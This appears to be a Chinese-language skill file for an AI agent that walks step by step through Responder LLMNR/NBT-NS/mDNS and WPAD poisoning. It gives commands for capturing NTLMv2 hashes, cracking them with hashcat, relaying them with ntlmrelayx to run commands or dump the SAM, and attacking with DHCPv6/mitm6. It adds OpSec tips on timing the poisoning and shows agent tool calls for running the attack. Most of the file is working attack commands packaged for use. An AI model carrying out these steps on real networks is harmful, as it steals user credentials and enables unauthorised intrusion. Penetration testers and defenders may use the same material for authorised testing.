---
name: responder-poison
description: "使用 Responder 进行 LLMNR/NBT-NS/MDNS 投毒和 NTLMv2 哈希捕获。当处于 Windows 域网络中、需要被动捕获凭据或进行中间人攻击时使用。Responder 监听网络中的名称解析广播请求（LLMNR/NBT-NS/MDNS），伪造响应诱使目标发送 NTLMv2 认证哈希。抓到的哈希可用 hashcat 离线破解或通过 ntlmrelayx 中继到其他服务。涉及 LLMNR 投毒、NBT-NS 投毒、WPAD 代理、NTLMv2 捕获、中间人攻击的场景使用此技能"
metadata:
  tags: "responder,llmnr,nbt-ns,mdns,ntlm,ntlmv2,poison,投毒,中间人,wpad,hash,凭据捕获"
  category: "tool"
---

# Responder LLMNR/NBT-NS 投毒

Responder 利用 Windows 名称解析的设计特性——当 DNS 查询失败时，Windows 会通过 LLMNR/NBT-NS 广播询问，Responder 伪造响应让目标把 NTLMv2 哈希发给你。**被动等待即可获取凭据，无需主动攻击。**

项目地址：https://github.com/lgandx/Responder

## 工作原理

**Windows 名称解析链**（Responder 利用第 4-6 步）:

```
1. 本地 hosts 文件
2. DNS 缓存
3. DNS 服务器查询
4. LLMNR (UDP 5355) — 链路本地多播
5. NBT-NS (UDP 137) — NetBIOS 广播
6. mDNS  (UDP 5353) — 多播 DNS
↓ DNS 查不到时，Windows 自动走 4-6 步广播/多播
↓ Responder 伪造 4-6 步的响应 → 目标发送 NTLMv2 认证
```

```
1. 目标访问不存在的共享 \\FILESERVER\share
2. DNS 查不到 FILESERVER
3. Windows 通过 LLMNR/NBT-NS 广播 "谁是 FILESERVER？"
4. Responder 响应 "我是！"
5. 目标向 Responder 发送 NTLMv2 认证
6. Responder 记录哈希
```

**常见触发场景**:

| 类型 | 场景 | 说明 |
|------|------|------|
| 被动 | 拼写错误 | 用户输入错误的服务器名 |
| 被动 | 过期快捷方式 | 指向已下线服务器的 .lnk |
| 被动 | 错误配置 | 应用配置中的无效主机名 |
| 被动 | WPAD | 浏览器自动代理发现 |
| 主动 | .lnk/.scf 文件 | 放置在共享目录中触发 NTLM |
| 主动 | RPC 强制认证 | PetitPotam/PrinterBug |

## 基本用法

```bash
# 启动 Responder（监听指定网卡）
responder -I eth0

# 详细模式（推荐）
responder -I eth0 -wv

# -w: 启用 WPAD 代理（捕获更多 HTTP 流量的哈希）
# -v: 详细输出
# -d: 启用 DHCP 投毒（DHCPv6 场景）
# -P: 强制 NTLM 认证代理（ProxyAuth）

# 只监听不投毒（分析模式，推荐先跑这个确认环境）
responder -I eth0 -A
```

## 捕获的哈希

Responder 抓到的哈希保存在日志目录：

```bash
# 默认路径
ls /usr/share/responder/logs/
# 或
ls /opt/Responder/logs/

# 哈希格式（NTLMv2）：
# user::DOMAIN:challenge:response:blob
# 可直接喂给 hashcat -m 5600

# NTLMv1 哈希（旧系统/降级攻击）：hashcat -m 5500
```

**Responder 数据库**：Responder 会记录已捕获的哈希避免重复，重新捕获时需清理：

```bash
# 数据库位置
ls /usr/share/responder/Responder.db
# 或 /opt/Responder/Responder.db

# 清理数据库（重新捕获所有哈希）
rm /usr/share/responder/Responder.db
```

## 配合 hashcat 破解

```bash
# 提取所有抓到的 NTLMv2 哈希
cat /usr/share/responder/logs/*.txt | sort -u > ntlmv2_hashes.txt

# hashcat 离线破解
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt

# -O 优化模式（截断密码长度换速度）
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -O
```

## 配合 ntlmrelayx 中继

**中继**比破解更强大——不需要知道明文密码，直接转发认证到其他目标：

```bash
# 终端 1：Responder 关闭 SMB 和 HTTP（让 ntlmrelayx 处理）
# 编辑配置文件:
# /etc/responder/Responder.conf 或 /opt/Responder/Responder.conf
# [Responder Core]
# SMB = Off
# HTTP = Off
responder -I eth0 -wv

# 终端 2：ntlmrelayx 中继到目标
ntlmrelayx.py -t smb://10.0.0.5 -smb2support

# 中继到多个目标
ntlmrelayx.py -tf targets.txt -smb2support

# 中继并执行命令
ntlmrelayx.py -t smb://10.0.0.5 -c "whoami" -smb2support

# 中继并导出凭据
ntlmrelayx.py -t smb://10.0.0.5 -smb2support --sam
```

## WPAD 攻击

```bash
# 启用 WPAD（自动代理发现）
responder -I eth0 -wv

# WPAD 攻击流程：
# 1. 浏览器广播 "谁是 wpad.corp.local？"
# 2. Responder 响应 "我是！"
# 3. 浏览器请求 /wpad.dat 代理配置
# 4. Responder 返回代理到自身的 PAC 文件
# 5. 浏览器所有 HTTP 流量经过 Responder 代理
# 6. 代理要求 NTLM 认证 → 捕获哈希
```

## DHCPv6 投毒

```bash
# Windows 默认优先 IPv6 → Responder 做 DHCPv6 服务器注入攻击者 DNS
responder -I eth0 -dv

# 配合 mitm6（更强的 IPv6 DNS 投毒）
mitm6 -d corp.local -i eth0
# 另一终端: ntlmrelayx.py -t ldaps://DC_IP -wh attacker.corp.local
```

## OpSec 注意事项

- **先跑分析模式** `responder -A` 确认环境有 LLMNR/NBT-NS 流量
- **限制投毒范围**：只在目标子网操作，避免大面积投毒
- **在业务时间投毒**：用户活跃时触发概率更高
- **检测指标**：异常 LLMNR/NBT-NS 响应、未知 IP 的认证请求、大量认证失败
- **Responder.db 管理**：定期检查避免遗漏重复用户的新哈希

## 使用 interactive_session 运行

Responder 需要持续监听，适合用 interactive_session：

```
# 启动 Responder
interactive_session(action="start", session_name="responder", command="responder -I eth0 -wv")

# 检查是否抓到哈希
interactive_session(action="read", session_name="responder", wait=5)

# 查看日志文件
interactive_session(action="send", session_name="responder_check", command="ls /usr/share/responder/logs/")
```

## 决策树

```
在域网络中获取凭据：
├─ 被动等待（安全、隐蔽）→ Responder 投毒
├─ 抓到 NTLMv2 哈希后：
│   ├─ 想知道明文密码 → hashcat -m 5600 离线破解
│   └─ 不需要明文、直接利用 → ntlmrelayx 中继
├─ 目标 SMB 签名未启用 → ntlmrelayx 中继（最有效）
├─ 目标 SMB 签名已启用 → 只能破解哈希
└─ 需要主动触发 → 通过漏洞让目标访问 \\ATTACKER\share
```
